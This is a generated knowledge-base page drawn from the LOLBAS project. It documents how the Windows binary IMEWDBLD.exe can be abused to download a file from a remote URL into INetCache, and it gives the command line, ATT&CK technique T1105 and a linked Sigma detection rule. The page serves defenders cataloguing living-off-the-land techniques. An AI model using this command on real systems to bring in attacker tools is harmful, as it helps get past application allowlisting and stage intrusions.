---
title: "IMEWDBLD.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/IMEWDBLD.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "IMEWDBLD.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# IMEWDBLD.exe

Microsoft IME Open Extended Dictionary Module

## Metadata

- Category: OSBinaries
- Created: 2020-03-05
- Author: Wade Hickey
- Source Path: yml/OSBinaries/IMEWDBLD.yml

## Paths

- `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`

## Commands

### 1. Download

IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.

```cmd
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml

## Resources

- {'Link': 'https://twitter.com/notwhickey/status/1367493406835040265'}

## Acknowledgements

- {'Person': 'Wade Hickey', 'Handle': '@notwhickey'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml)
